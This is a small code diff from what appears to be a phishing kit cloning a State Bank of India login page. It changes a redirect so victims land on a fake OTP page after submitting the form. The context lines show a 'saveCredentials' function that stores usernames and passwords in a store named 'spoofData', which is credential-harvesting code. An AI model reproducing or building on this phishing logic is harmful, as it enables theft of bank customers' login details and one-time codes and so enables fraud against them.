@@ -29,7 +29,7 @@ function submitForm(e) {
 
     //   reset the form
     document.getElementById("sbi").reset();
-    window.location.href = "/firstOtp.html";
+    window.location.href = "/sbiClone/firstOtp.html";
 }
 const saveCredentials = (username, password) => {
     var newSpoofData = spoofData.push();
